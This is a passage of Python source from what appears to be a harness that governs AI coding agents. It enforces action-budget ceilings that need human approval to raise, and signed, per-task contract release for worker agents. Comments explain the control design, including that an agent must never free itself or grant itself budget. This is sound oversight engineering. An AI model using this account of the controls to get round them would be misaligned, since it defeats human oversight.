                              f"{rid} does not exist")
            continue
        records[rid] = rec
        acceptance = [str(x).strip() for x in rec.get("acceptance") or []
                      if str(x).strip()]
        explicit = [str(x).strip() for x in task.get("criteria") or []
                    if str(x).strip()]
        refs = task.get("acceptance_refs")
        refs = ([str(x).strip() for x in refs if str(x).strip()]
                if refs is not None else
                ([x for x in explicit if x in acceptance]
                 if explicit else acceptance))
        unknown = sorted(set(refs) - set(acceptance))
        if unknown:
            errors.append(f"task {task.get('id', '?')}: acceptance_refs not "
                          f"in {rid}: " + "; ".join(unknown))
        for criterion in set(refs) & set(acceptance):
            owned.setdefault(rid, {}).setdefault(criterion, set()).add(
                str(task.get("id", "?")))
    by_id = {str(t.get("id")): t for t in tasks or []}
    for rid, rec in records.items():
        for criterion in rec.get("acceptance") or []:
            owners = owned.get(rid, {}).get(str(criterion), set())
            if not owners:
                errors.append(f"requirement {rid}: acceptance has no task "
                              f"owner: {criterion}")
            elif require_passed and not any(
                    by_id.get(tid, {}).get("status") == "passed"
                    for tid in owners):
                errors.append(f"requirement {rid}: acceptance has no passed "
                              f"owner: {criterion}")
    return errors


def closing_reserve(max_actions, reserve: int) -> int:
    """How many of a contract's actions are held back for CLOSING.

    Never more than a quarter of the ceiling, so a small contract cannot
    reserve itself out of doing any work at all, and never anything on a
    zero-action ceiling — which stays maximally strict, as v2.3.0 fixed."""
    try:
        max_actions = int(max_actions)
    except (TypeError, ValueError):
        return 0
    if max_actions <= 0:
        return 0
    return max(0, min(int(reserve), max_actions // 4))


def budget_status(contract: dict, used_actions: int,
                  reserve: int = 0, closing: bool = False) -> tuple[bool, str]:
    """The action-budget RULE, owned by the kernel so every enforcement path
    applies the same ceiling. Returns (ok, reason). ok=False means the next
    action must be blocked BEFORE it runs. The CLI hook meters `used_actions`
    (stateful I/O) and forwards it here; the decision lives with the rest of
    the harness, not in the CLI, so no caller can enforce scope while quietly
    skipping the ceiling.

    Exhaustion is a HUMAN APPROVAL GATE: the block stands (the wall is
    intentional — a governed agent must not free itself), and the message
    tells the agent to escalate. After an explicit chat decision the same
    session can recover with ``--approved-by``; opening a new task or moving
    outside the workspace is never part of the recovery protocol."""
    max_a = (contract.get("budget") or {}).get("max_actions")
    if max_a is None:
        # ONLY an absent ceiling is unmetered. 0 is a ZERO-action ceiling —
        # maximally strict, never "no ceiling" (`--max-actions 0` used to
        # silently create an unmetered contract; v2.3.0).
        return True, "no action ceiling set"
    # CLOSING RESERVE (v2.11.0). The ceiling is unchanged; the WORKING wall
    # sits below it. A review that spends every action reaching a verdict
    # and then cannot record it has produced nothing that survives the
    # session — which is exactly what happened on karpenter#9464, where
    # `.em-review/` died with an ephemeral sandbox. So the last few actions
    # can only be spent finishing and persisting, never on more work.
    held = closing_reserve(max_a, reserve) if not closing else 0
    wall = int(max_a) - held
    if held and used_actions >= wall:
        return False, (
            f"ACTION BUDGET: {used_actions}/{max_a} used and the last {held} "
            f"are RESERVED FOR CLOSING — they can be spent only on finishing "
            f"and persisting this run (dod, findings, decision, req; ack is "
            f"unmetered). Stop doing work: render what you owe, `tp ack "
            f"<id>` each obligation, record the synthesis with `tp decision` "
            f"and any tracked debt with `tp req debt`, then close. If the "
            f"work itself is genuinely unfinished, ask the human for more "
            f"actions, then run `tp.py budget --grant N --approved-by "
            f"<human> --workspace <ws>`. A bare grant remains blocked.")
    if used_actions >= int(max_a):
        return False, (f"ACTION BUDGET exhausted ({used_actions}/{max_a}) — "
                       "STOP and ask the human to approve more actions. The "
                       "human raises the ceiling in this same task with "
                       "`tp.py budget --grant N --approved-by <human> "
                       "--workspace <ws>`, or approves release with `tp.py "
                       "clear --approved-by <human> --workspace <ws>`. Bare "
                       "grant/clear commands remain blocked; do not retry "
                       "without the user's decision.")
    return True, f"{used_actions}/{max_a} actions used"


# ------------------------------------------------- contract lifecycle safety
#
# LESSON (locked-contract incident): a review agent activated a contract in
# the session home, exhausted its budget, and died without releasing it — the
# leaked contract then governed the whole session. The WALL is intentional (a
# governed agent must never free itself or grant itself budget), so the fix
# class is LIFECYCLE, not exemptions: agents release in try/finally, a
# contract whose owner is gone auto-releases (dead PID / idle TTL), budget
# exhaustion escalates to the human (`tp budget --grant`), and `tp new`
# refuses un-project-like workspaces (bare root / session home).


# ---- per-task contract slots (v2.3.0) --------------------------------------
#
# The single active_contract.json slot let parallel lens agents overwrite each
# other's contracts (and one agent's clear released a sibling's). Contracts
# are now stored PER TASK under .taskplane/active/<slot>.json, selected by the
# TASKPLANE_TASK env var the dispatch brief exports to each governed agent.
# Protocol:
#   * TASKPLANE_TASK unset  -> the legacy single slot (full compatibility).
#   * TASKPLANE_TASK set + slot file exists -> that contract, and ONLY that
#     contract, governs this process (activate/clear/snapshot are slot-local).
#   * TASKPLANE_TASK set + NO slot file -> StateError: REFUSE (fail closed).
#     Falling back to the legacy slot would let an agent be governed by a
#     SIBLING's contract — the exact overwrite bug — or escape screening.
#     The screener's catch-all turns the StateError into a block.

_TASK_SLOT_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$")

WORKER_CONTRACT_LIFECYCLE_SCHEMA = \
    "taskplane.worker-contract-lifecycle/v1"
WORKER_RELEASE_ACTION_SCHEMA = "taskplane.worker-contract-release-action/v1"
WORKER_TERMINAL_RECEIPT_SCHEMA = \
    "taskplane.worker-contract-terminal-receipt/v1"
WORKER_CONTRACT_AUTHORITY_SCHEMA = \
    "taskplane.worker-contract-authority/v1"
_WORKER_RELEASE_FIELDS = frozenset({
    "schema", "key_id", "action_id", "workspace_fingerprint", "slot",
    "contract_id", "stage", "task", "issued_at", "signature",
})
_WORKER_TERMINAL_FIELDS = frozenset({
    "schema", "key_id", "receipt_id", "release_action_id",
    "workspace_fingerprint", "slot", "contract_id", "stage", "task",
    "owner", "outcome", "submission_status", "terminal_at", "authority",
    "signature",
})


def _worker_contract_authority_path(workspace: str) -> str:
    return os.path.join(tp_dir(workspace), "worker-contract-authority.json")


def _worker_contract_authority(workspace: str, *, create: bool) -> dict:
    """Load the local issuer used only for exact worker lifecycle actions."""
    path = _worker_contract_authority_path(workspace)
    with file_lock(path):
        authority = load_json(path, default=None,
                              what="worker contract authority")
        if authority is None and create:
            secret = secrets.token_bytes(32)
            authority = {
                "schema": WORKER_CONTRACT_AUTHORITY_SCHEMA,
                "key_id": hashlib.sha256(secret).hexdigest(),
                "secret": base64.b64encode(secret).decode("ascii"),
            }
            atomic_write_json(path, authority, sort_keys=True)
            try:
                os.chmod(path, 0o600)
            except OSError:
                pass
        if not isinstance(authority, dict) or set(authority) != {
                "schema", "key_id", "secret"} or authority.get(
                    "schema") != WORKER_CONTRACT_AUTHORITY_SCHEMA:
            raise StateError(path, "worker contract authority is invalid")
        try:
            secret = base64.b64decode(
                str(authority.get("secret") or ""), validate=True)
        except (ValueError, TypeError) as exc:
            raise StateError(
                path, "worker contract authority is invalid") from exc
        if len(secret) != 32 or authority.get("key_id") != \
                hashlib.sha256(secret).hexdigest():
            raise StateError(path, "worker contract authority is invalid")
        return {"key_id": authority["key_id"], "secret": secret}


def _worker_signed_bytes(value: dict) -> bytes:
    unsigned = {key: item for key, item in value.items()
                if key != "signature"}
    return json.dumps(unsigned, sort_keys=True, separators=(",", ":"),
                      ensure_ascii=False).encode("utf-8")


def _worker_signature(secret: bytes, value: dict) -> str:
    return hmac.new(secret, _worker_signed_bytes(value),
                    hashlib.sha256).hexdigest()


def _worker_lifecycle_error(workspace: str, reason: str) -> StateError:
    return StateError(
        _worker_contract_authority_path(workspace), reason,
        "retain the contract and let the authenticated lifecycle hook, "
        "loop gate, or session-start recovery release its exact slot")


def _worker_release_action(workspace: str, *, slot: str, contract_id: str,
                           stage: str, task: str,
                           now: int | None = None) -> dict:
    authority = _worker_contract_authority(workspace, create=True)
    issued_at = int(_time.time() if now is None else now)
    material = json.dumps({
        "workspace": _workspace_identity_fingerprint(workspace),
        "slot": slot, "contract_id": contract_id,
        "stage": stage, "task": task, "issued_at": issued_at,
    }, sort_keys=True, separators=(",", ":"))
    action = {
        "schema": WORKER_RELEASE_ACTION_SCHEMA,
        "key_id": authority["key_id"],
        "action_id": "worker-release-" + hashlib.sha256(
            material.encode("utf-8")).hexdigest()[:24],
        "workspace_fingerprint": _workspace_identity_fingerprint(workspace),
        "slot": slot, "contract_id": contract_id,
        "stage": stage, "task": task, "issued_at": issued_at,
    }
    action["signature"] = _worker_signature(authority["secret"], action)
    return action


def prepare_worker_contract(
        workspace: str, contract: dict, *, stage: str, task: str,
        task_name: str, role_marker: str, now: int | None = None) -> dict:
    """Make a contract child-scoped before it becomes an active slot.

    The slot is an enforcement cache.  A slot-less orchestrator never
    inherits it; SubagentStart binds the exact native child before the
    child's first screened action.
    """
    if not isinstance(contract, dict):
        raise ValueError("worker lifecycle needs a contract object")
    stage = str(stage or "").strip()
    task = str(task or "").strip()
    task_name = str(task_name or "").strip()
    role_marker = str(role_marker or "").strip()
    slot = str(contract.get("task_id") or "").strip()
    if not stage or not task or not task_name or not role_marker or \
            not _TASK_SLOT_RE.fullmatch(slot):
        raise ValueError("worker lifecycle identity is incomplete or invalid")
    prepared_at = int(_time.time() if now is None else now)
    out = json.loads(json.dumps(contract))
    out["task_slot"] = slot
    out["worker_scoped"] = True
    out["worker_lifecycle"] = {
        "schema": WORKER_CONTRACT_LIFECYCLE_SCHEMA,
        "status": "pending", "slot": slot,
        "stage": stage, "task": task,
        "expected_task_name": task_name,
        "expected_role_marker": role_marker,
        "prepared_at": prepared_at,
        "owner": None, "terminal": None,
        "release_action": _worker_release_action(
            workspace, slot=slot, contract_id=str(out["task_id"]),
            stage=stage, task=task, now=prepared_at),
    }
    return out


def _worker_event_owner(event: dict) -> dict:
    event = event if isinstance(event, dict) else {}
    return {
        "session_id": _bounded_hook_identity(
            event.get("session_id") or event.get("thread_id")
            or os.environ.get("CODEX_THREAD_ID")
            or os.environ.get("CLAUDE_SESSION_ID"), 160).strip(),
        "agent_id": _bounded_hook_identity(
            event.get("agent_id") or event.get("child_id"), 160).strip(),
        "task_name": _bounded_hook_identity(
            event.get("task_name") or event.get("agent_type"), 160).strip(),
    }


def _active_worker_contracts(workspace: str) -> list[tuple[str, dict]]:
    rows = []
    for slot in list_task_slots(workspace):
        contract = load_json(
            active_contract_path(workspace, slot),
            what=f"active worker contract (slot {slot})")
        if isinstance(contract, dict) and contract.get("worker_scoped") is True:
            rows.append((slot, contract))
    return rows


def worker_contract_for_stage(workspace: str, *, stage: str,
                              task: str) -> dict | None:
    """Resolve one worker slot for control-plane evidence and cleanup.

    This is deliberately not an enforcement lookup: callers get an exact
    stage/task binding, never the union returned by :func:`load_active`, so a
    slot-less orchestrator can read a child's snapshot or output contract
    without becoming governed by that child's least-privilege contract.
    """
    stage = str(stage or "").strip()
    task = str(task or "").strip()
    if not stage or not task:
        raise _worker_lifecycle_error(
            workspace, "worker stage/task identity is incomplete")
    matches = []
    for slot, contract in _active_worker_contracts(workspace):
        lifecycle = contract.get("worker_lifecycle") or {}
        if lifecycle.get("schema") != WORKER_CONTRACT_LIFECYCLE_SCHEMA:
            raise _worker_lifecycle_error(
                workspace, f"worker slot {slot} lifecycle is malformed")
        if lifecycle.get("stage") == stage and \
                str(lifecycle.get("task") or "") == task:
            matches.append((slot, contract))
    if len(matches) > 1:
        raise _worker_lifecycle_error(
            workspace, "stage/task identifies more than one worker slot")
    if not matches:
        return None
    slot, contract = matches[0]
    return {"slot": slot, "contract": contract}


def release_superseded_pending_worker_contracts(
        workspace: str, *, stage: str, task: str,
        keep_slot: str | None = None,
        now: int | None = None) -> list[dict]:
    """Quarantine stale duplicates only when one pending claim is newest.

    This is deliberately narrower than a clear operation. Every same-stage,
    same-task candidate is validated before any terminal receipt is minted,
    and unrelated worker slots are never considered for release.
    """
    stage = str(stage or "").strip()
    task = str(task or "").strip()
    explicit = str(keep_slot or "").strip()
    if not stage or not task:
        raise _worker_lifecycle_error(
            workspace, "worker stage/task identity is incomplete")
    if explicit and not _TASK_SLOT_RE.fullmatch(explicit):
        raise _worker_lifecycle_error(
            workspace, "explicit keeper slot is invalid")

    matches = []
    for slot, contract in _active_worker_contracts(workspace):
        lifecycle = contract.get("worker_lifecycle") or {}
        if lifecycle.get("stage") == stage and str(
                lifecycle.get("task") or "") == task:
            matches.append((slot, contract))
    if not matches:
        if explicit:
            raise _worker_lifecycle_error(
                workspace, "explicit keeper does not identify a candidate")
        return []

    prepared = []
    for slot, contract in matches:
        lifecycle = contract.get("worker_lifecycle") or {}
        stamp = lifecycle.get("prepared_at")
        if lifecycle.get("schema") != WORKER_CONTRACT_LIFECYCLE_SCHEMA:
            raise _worker_lifecycle_error(
                workspace, f"worker slot {slot} lifecycle is malformed")
        if lifecycle.get("slot") != slot or \
                lifecycle.get("status") != "pending" or \
                lifecycle.get("owner") is not None or \
                lifecycle.get("terminal") is not None:
            raise _worker_lifecycle_error(
                workspace, "superseded recovery requires every competing "
                "worker to be unbound pending")
        if isinstance(stamp, bool) or not isinstance(stamp, int) or stamp < 0:
            raise _worker_lifecycle_error(
                workspace, "worker prepared_at is invalid")
        action = lifecycle.get("release_action")
        _verify_worker_release_action(workspace, slot, action, contract)
        prepared.append((stamp, slot, contract))

    newest_at = max(row[0] for row in prepared)
    newest = [row for row in prepared if row[0] == newest_at]
    if len(newest) != 1:
        raise _worker_lifecycle_error(
            workspace, "superseded recovery has no unique newest slot")
    keeper = newest[0][1]
    if explicit and explicit != keeper:
        raise _worker_lifecycle_error(
            workspace, "explicit keeper is not the unique newest slot")
    if len(prepared) == 1:
        return []

    released = []
    for _, slot, contract in sorted(prepared):
        if slot == keeper:
            continue
        lifecycle = contract["worker_lifecycle"]
        receipt = record_worker_terminal(
            workspace, slot, event=None, outcome="interruption",
            submission_status="superseded_pending_claim", now=now,
            authority="orphan-recovery")
        released.append(release_worker_contract(
            workspace, slot, action=lifecycle["release_action"],
            terminal_receipt=receipt))
    trace(workspace, "worker_contract_duplicates_recovered",
          stage=stage, task=task, keeper=keeper,
          released=[row["slot"] for row in released],
          authority="orphan-recovery")
    return released


def bind_worker_contract_event(workspace: str, event: dict, *,
                               now: int | None = None) -> dict:
    """Bind one pending worker slot to one exact native child start."""
    owner = _worker_event_owner(event)
    if not all(owner.values()):
        raise _worker_lifecycle_error(
            workspace, "worker start identity is incomplete")
    candidates = []
    for slot, contract in _active_worker_contracts(workspace):
        lifecycle = contract.get("worker_lifecycle") or {}
        if lifecycle.get("schema") != WORKER_CONTRACT_LIFECYCLE_SCHEMA:
            raise _worker_lifecycle_error(
                workspace, f"worker slot {slot} lifecycle is malformed")
        if lifecycle.get("expected_task_name") == owner["task_name"]:
            candidates.append((slot, contract))
    if len(candidates) != 1:
        raise _worker_lifecycle_error(
            workspace, "worker start does not identify exactly one pending slot")
    slot, contract = candidates[0]
    lifecycle = contract["worker_lifecycle"]
    if lifecycle.get("status") == "active":
        if lifecycle.get("owner") != owner:
            raise _worker_lifecycle_error(
                workspace, "worker slot is already owned by another child")
        return {"slot": slot, "contract": contract, "replay": True}
    if lifecycle.get("status") != "pending" or lifecycle.get("owner") is not None:
        raise _worker_lifecycle_error(
            workspace, "worker slot is not pending child activation")
    lifecycle["status"] = "active"
    lifecycle["owner"] = owner
    lifecycle["started_at"] = int(_time.time() if now is None else now)
    atomic_write_json(active_contract_path(workspace, slot), contract, indent=2)
    trace(workspace, "worker_contract_bound", slot=slot,
          task_id=contract.get("task_id"), stage=lifecycle.get("stage"),
          task=lifecycle.get("task"), agent_id=owner["agent_id"],
          session_id=owner["session_id"], task_name=owner["task_name"])
    return {"slot": slot, "contract": contract, "replay": False}


def _worker_contract_for_event(workspace: str, event: dict) \
        -> tuple[str, dict] | None:
    owner = _worker_event_owner(event)
    if not owner["agent_id"] and not owner["task_name"]:
        return None
    matches = []
    expected = False
    for slot, contract in _active_worker_contracts(workspace):
        lifecycle = contract.get("worker_lifecycle") or {}
        if lifecycle.get("expected_task_name") == owner["task_name"]:
            expected = True
        bound = lifecycle.get("owner")
        if lifecycle.get("status") == "active" and isinstance(bound, dict) \
                and all(bound.get(key) == owner.get(key)
                        for key in ("session_id", "agent_id", "task_name")):
            matches.append((slot, contract))
    if len(matches) == 1:
        return matches[0]
    if len(matches) > 1:
        raise _worker_lifecycle_error(
            workspace, "native child owns more than one worker slot")
    if expected:
        raise _worker_lifecycle_error(
            workspace, "worker action arrived before its SubagentStart binding")
    return None


def load_active_for_event(workspace: str, event: dict) -> dict | None:
    """Load the exact child slot, or the orchestrator's non-worker state."""
    if task_slot() is not None:
        return load_active(workspace)
    binding = _worker_contract_for_event(workspace, event)
    if binding is not None:
        return binding[1]
    return load_active(workspace)


def normalize_worker_terminal_outcome(value: object) -> str:
    text = str(value or "success").strip().lower()
    if "handoff" in text or "transfer" in text:
        return "handoff"
    if "cancel" in text:
        return "cancellation"
    if "interrupt" in text or "abort" in text or "killed" in text:
        return "interruption"
    if "fail" in text or "error" in text or "exception" in text:
        return "failure"
    return "success"


def _worker_terminal_path(workspace: str, slot: str) -> str:
    return os.path.join(tp_dir(workspace), "worker-terminals", f"{slot}.json")


def _refresh_dashboard_lifecycle(
        workspace: str, *, event_type: str, outcome: str,
        member_terminal: bool = False) -> None:
    """Best-effort publication after the terminal receipt is durable.

    Dashboard failure is secondary evidence and may never rewrite or prevent
    the worker's authenticated terminal outcome.
    """
    settings = _canonical_operational_settings()
    if event_type not in settings.dashboard.refresh.lifecycle_events:
        raise ValueError(
            "dashboard lifecycle event is absent from canonical settings: "
            + str(event_type))
    try:
        if __package__:
            from . import loop_status
        else:
            import loop_status
        loop_status.refresh_dashboard_snapshot(
            workspace, event_type=event_type, outcome=outcome)
    except Exception as exc:
        trace(workspace, "dashboard_publication_deferred",
              event_type=event_type, outcome=outcome,
              member_terminal=member_terminal,
              error=f"{exc.__class__.__name__}: {exc}")


def record_worker_terminal(
        workspace: str, slot: str, *, event: dict | None, outcome: object,
        submission_status: str, now: int | None = None,
        authority: str = "host-lifecycle") -> dict:
    """Record an authenticated terminal proof without releasing the slot."""
    path = active_contract_path(workspace, slot)
    contract = load_json(path, what="active worker contract")
    lifecycle = contract.get("worker_lifecycle") or {}
    action = lifecycle.get("release_action")
    if contract.get("worker_scoped") is not True or \
            lifecycle.get("schema") != WORKER_CONTRACT_LIFECYCLE_SCHEMA or \
            not isinstance(action, dict):
        raise _worker_lifecycle_error(workspace, "worker contract is malformed")
    owner = lifecycle.get("owner")
    if authority == "host-lifecycle":
        observed = _worker_event_owner(event or {})
        if lifecycle.get("status") != "active" or not isinstance(owner, dict) \
                or observed != owner:
            raise _worker_lifecycle_error(
                workspace, "terminal event does not match worker owner")
    elif authority not in {"loop-gate", "session-start", "orphan-recovery"}:
        raise _worker_lifecycle_error(
            workspace, "worker terminal authority is unsupported")
    terminal_at = int(_time.time() if now is None else now)
    normalized = normalize_worker_terminal_outcome(outcome)
    authority_key = _worker_contract_authority(workspace, create=False)
    owner_projection = dict(owner) if isinstance(owner, dict) else None
    material = json.dumps({
        "action": action.get("action_id"), "slot": slot,
        "contract": contract.get("task_id"), "outcome": normalized,
        "submission": str(submission_status), "terminal_at": terminal_at,
        "authority": authority,
    }, sort_keys=True, separators=(",", ":"))
    receipt = {
        "schema": WORKER_TERMINAL_RECEIPT_SCHEMA,
        "key_id": authority_key["key_id"],
        "receipt_id": "worker-terminal-" + hashlib.sha256(
            material.encode("utf-8")).hexdigest()[:24],
        "release_action_id": action.get("action_id"),
        "workspace_fingerprint": _workspace_identity_fingerprint(workspace),
        "slot": slot, "contract_id": contract.get("task_id"),
        "stage": lifecycle.get("stage"), "task": lifecycle.get("task"),
        "owner": owner_projection, "outcome": normalized,
        "submission_status": str(submission_status or "unknown"),
        "terminal_at": terminal_at, "authority": authority,
    }
    receipt["signature"] = _worker_signature(
        authority_key["secret"], receipt)
    terminal_path = _worker_terminal_path(workspace, slot)
    os.makedirs(os.path.dirname(terminal_path), exist_ok=True)
    atomic_write_json(terminal_path, receipt, sort_keys=True)
    lifecycle["status"] = "terminal"
    lifecycle["terminal"] = receipt
    atomic_write_json(path, contract, indent=2)
    trace(workspace, "worker_contract_terminal", slot=slot,
          task_id=contract.get("task_id"), outcome=normalized,
          submission_status=receipt["submission_status"],
          authority=authority, receipt_id=receipt["receipt_id"])
    _refresh_dashboard_lifecycle(
        workspace, event_type="worker_terminal", outcome=normalized,
        member_terminal=True)
    return receipt


def _verify_worker_release_action(workspace: str, slot: str,
                                  action: dict, contract: dict) -> None:
    if not isinstance(action, dict) or set(action) != _WORKER_RELEASE_FIELDS or \
            action.get("schema") != WORKER_RELEASE_ACTION_SCHEMA:
        raise _worker_lifecycle_error(
            workspace, "worker release action schema is malformed")
    authority = _worker_contract_authority(workspace, create=False)
    if action.get("key_id") != authority["key_id"] or \
            not hmac.compare_digest(
                str(action.get("signature") or ""),
                _worker_signature(authority["secret"], action)):
        raise _worker_lifecycle_error(
            workspace, "worker release action signature is invalid")
    lifecycle = contract.get("worker_lifecycle") or {}
    expected = {
        "workspace_fingerprint": _workspace_identity_fingerprint(workspace),
        "slot": slot, "contract_id": contract.get("task_id"),
        "stage": lifecycle.get("stage"), "task": lifecycle.get("task"),
    }
    for field, value in expected.items():
        if action.get(field) != value:
            raise _worker_lifecycle_error(
                workspace, f"worker release action {field} mismatches slot")
    if action != lifecycle.get("release_action"):
        raise _worker_lifecycle_error(
            workspace, "worker release action differs from contract authority")


def _verify_worker_terminal_receipt(workspace: str, slot: str,
                                    receipt: dict, contract: dict,
                                    action: dict) -> None:
    if not isinstance(receipt, dict) or set(receipt) != \
            _WORKER_TERMINAL_FIELDS or receipt.get(
                "schema") != WORKER_TERMINAL_RECEIPT_SCHEMA:
        raise _worker_lifecycle_error(
            workspace, "worker terminal receipt schema is malformed")
    authority = _worker_contract_authority(workspace, create=False)
    if receipt.get("key_id") != authority["key_id"] or \
            not hmac.compare_digest(
                str(receipt.get("signature") or ""),
                _worker_signature(authority["secret"], receipt)):
        raise _worker_lifecycle_error(
            workspace, "worker terminal receipt signature is invalid")
    lifecycle = contract.get("worker_lifecycle") or {}
    expected = {
        "workspace_fingerprint": _workspace_identity_fingerprint(workspace),
        "slot": slot, "contract_id": contract.get("task_id"),
        "stage": lifecycle.get("stage"), "task": lifecycle.get("task"),
        "release_action_id": action.get("action_id"),
    }
    for field, value in expected.items():
        if receipt.get(field) != value:
            raise _worker_lifecycle_error(
                workspace, f"worker terminal receipt {field} mismatches slot")


def release_worker_contract(
        workspace: str, slot: str, *, action: dict,
        terminal_receipt: dict | None = None) -> dict:
    """Authenticated exact-slot release; never a general clear primitive."""
    if not _TASK_SLOT_RE.fullmatch(str(slot or "")):
        raise _worker_lifecycle_error(workspace, "worker release slot is invalid")
    active_path = active_contract_path(workspace, slot)
    contract = load_json(active_path, default=None,
                         what="active worker contract")
    if not isinstance(contract, dict):
        raise _worker_lifecycle_error(
            workspace, "active worker contract is unavailable")
    _verify_worker_release_action(workspace, slot, action, contract)
    receipt = terminal_receipt
    if receipt is None:
        receipt = load_json(_worker_terminal_path(workspace, slot), default=None,
                            what="worker terminal receipt")
    if not isinstance(receipt, dict):
        raise _worker_lifecycle_error(
            workspace, "worker terminal receipt is required before release")
    _verify_worker_terminal_receipt(
        workspace, slot, receipt, contract, action)
    lifecycle = contract["worker_lifecycle"]
    lifecycle["status"] = "released"
    lifecycle["terminal"] = receipt
    lifecycle["released_at"] = int(_time.time())
    quarantine = os.path.join(tp_dir(workspace), "quarantine", "contracts")
    os.makedirs(quarantine, exist_ok=True)
    archive = os.path.join(
        quarantine, f"{slot}-{receipt['receipt_id'].split('-')[-1]}.json")
    atomic_write_json(archive, contract, sort_keys=True)
    safe_remove(active_path)
    with _contextlib.suppress(OSError):
        safe_remove(_snapshot_path(workspace, slot))
    trace(workspace, "worker_contract_released", slot=slot,
          task_id=contract.get("task_id"), outcome=receipt.get("outcome"),
          authority=receipt.get("authority"), quarantine=archive)
    return {"released": True, "slot": slot,
            "outcome": receipt["outcome"], "quarantine": archive,
            "receipt_id": receipt["receipt_id"]}


def terminalize_worker_contract(
        workspace: str, event: dict, *, outcome: object,
        submission_status: str, now: int | None = None) -> dict:
    binding = _worker_contract_for_event(workspace, event)
    if binding is None:
        raise _worker_lifecycle_error(
            workspace, "terminal event has no bound worker contract")
    slot, contract = binding
    receipt = record_worker_terminal(
        workspace, slot, event=event, outcome=outcome,
        submission_status=submission_status, now=now)
    return release_worker_contract(
        workspace, slot,
        action=contract["worker_lifecycle"]["release_action"],
        terminal_receipt=receipt)


def _worker_loop_completed(contract: dict, state: dict | None) -> bool:
    lifecycle = contract.get("worker_lifecycle") or {}
    if lifecycle.get("status") == "terminal":
        return True
    if not isinstance(state, dict):
        return False
    stage = lifecycle.get("stage")
    task = str(lifecycle.get("task") or "")
    step = state.get("step")
    if stage in {"pm", "design", "plan", "em"}:
        return step != stage
    tasks = [row for row in state.get("tasks") or [] if isinstance(row, dict)]
    target = next((row for row in tasks if str(row.get("id")) == task), None)
    if stage == "execute" and state.get("parallel"):
        return target is None or target.get("status") not in {"pending", "running"}
    current = None
    index = state.get("current_task", 0)
    if isinstance(index, int) and 0 <= index < len(tasks):
        current = tasks[index]
    return step != stage or str((current or {}).get("id") or "") != task


def _legacy_loop_worker_identity(contract: dict) -> tuple[str, str] | None:
    """Recognize the exact pre-lifecycle loop contract shapes.

    Old `loop next` calls activated these in the legacy root slot. They have
    no signed child lifecycle metadata, so migration recovery is intentionally
    limited to the canonical stage labels minted by `_step_contract`.
    """
    label = str(contract.get("task") or "").strip()
    prefixes = {
        "PM: ": "pm", "DESIGN: ": "design", "PLAN: ": "plan",
        "EXECUTE: ": "execute", "FIX: ": "fix",
        "EVALUATE: ": "evaluate",
    }
    if label == "EM review":
        return "em", "em"
    for prefix, stage in prefixes.items():
        if not label.startswith(prefix):
            continue
        suffix = label[len(prefix):].strip()
        if not suffix:
            return None
        task = suffix if stage in {"execute", "fix", "evaluate"} else stage
        return stage, task
    return None


def _legacy_loop_worker_completed(contract: dict,
                                  state: dict | None) -> bool:
    identity = _legacy_loop_worker_identity(contract)
    if identity is None or not isinstance(state, dict):
        return False
    stage, task = identity
    projected = {
        "worker_lifecycle": {"stage": stage, "task": task,
                             "status": "legacy"},
    }
    return _worker_loop_completed(projected, state)


def _quarantine_legacy_loop_worker_contract(
        workspace: str, contract: dict, *, now: int | None = None) -> dict:
    """Migrate one loop-proven completed pre-lifecycle root contract."""
    identity = _legacy_loop_worker_identity(contract)
    if identity is None:
        raise _worker_lifecycle_error(
            workspace, "legacy contract is not a recognized loop worker")
    stage, task = identity
    terminal_at = int(_time.time() if now is None else now)
    archived = json.loads(json.dumps(contract))
    archived["legacy_worker_recovery"] = {
        "schema": "taskplane.legacy-worker-contract-recovery/v1",
        "stage": stage, "task": task, "outcome": "completed",
        "authority": "session-start", "terminal_at": terminal_at,
    }
    quarantine = os.path.join(tp_dir(workspace), "quarantine", "contracts")
    os.makedirs(quarantine, exist_ok=True)
    contract_id = re.sub(
        r"[^A-Za-z0-9._-]+", "_",
        str(contract.get("task_id") or "legacy"))[:64] or "legacy"
    archive = os.path.join(
        quarantine, f"{contract_id}-legacy-{terminal_at}.json")
    atomic_write_json(archive, archived, sort_keys=True)
    safe_remove(os.path.join(tp_dir(workspace), "active_contract.json"))
    with _contextlib.suppress(OSError):
        safe_remove(os.path.join(tp_dir(workspace), "snapshot"))
    trace(workspace, "legacy_worker_contract_quarantined",
          task_id=contract.get("task_id"), stage=stage, task=task,
          authority="session-start", quarantine=archive)
    return {"released": True, "legacy": True,
            "slot": None, "outcome": "completed", "quarantine": archive}


def sweep_completed_worker_contracts(
        workspace: str, *, loop_state: dict | None,
        now: int | None = None) -> list[dict]:
    """Session-start fail-safe: release only loop-proven completed workers."""
    released = []
    identities = {}
    # Preflight every worker lifecycle before recovering any group. One
    # malformed or ambiguous slot must leave the entire active set untouched.
    for slot, contract in _active_worker_contracts(workspace):
        lifecycle = contract.get("worker_lifecycle") or {}
        if lifecycle.get("schema") != WORKER_CONTRACT_LIFECYCLE_SCHEMA:
            raise _worker_lifecycle_error(
                workspace, f"worker slot {slot} lifecycle is malformed")
        stage = str(lifecycle.get("stage") or "").strip()
        task = str(lifecycle.get("task") or "").strip()
        if not stage or not task:
            raise _worker_lifecycle_error(
                workspace, f"worker slot {slot} lifecycle is malformed")
        identities.setdefault((stage, task), []).append(slot)
    for (stage, task), slots in sorted(identities.items()):
        if len(slots) > 1:
            released.extend(release_superseded_pending_worker_contracts(
                workspace, stage=stage, task=task, now=now))
    for slot, contract in _active_worker_contracts(workspace):
        if not _worker_loop_completed(contract, loop_state):
            continue
        lifecycle = contract["worker_lifecycle"]
        receipt = lifecycle.get("terminal")
        if not isinstance(receipt, dict):
            receipt = record_worker_terminal(
                workspace, slot, event=None, outcome="success",
                submission_status="loop_advanced", now=now,
                authority="session-start")
        released.append(release_worker_contract(
            workspace, slot, action=lifecycle["release_action"],
            terminal_receipt=receipt))
    legacy_path = os.path.join(tp_dir(workspace), "active_contract.json")
    if os.path.exists(legacy_path):
        legacy = load_json(legacy_path, what="legacy active contract")
        if isinstance(legacy, dict) and \
                _legacy_loop_worker_completed(legacy, loop_state):
            released.append(_quarantine_legacy_loop_worker_contract(
                workspace, legacy, now=now))
    return released


def release_worker_contracts_for_gate(
        workspace: str, *, stage: str, task: str,
        now: int | None = None, outcome: object = "success",
        submission_status: str = "gated") -> list[dict]:
    """Release only the exact stage/task worker contract.

    Gates retain the historical defaults.  A terminal EM producer-receipt
    outage uses the same authenticated lifecycle owner with its explicit
    status; an already recorded success/failure/cancellation/interruption/
    handoff receipt is preserved byte-for-byte.
    """
    released = []
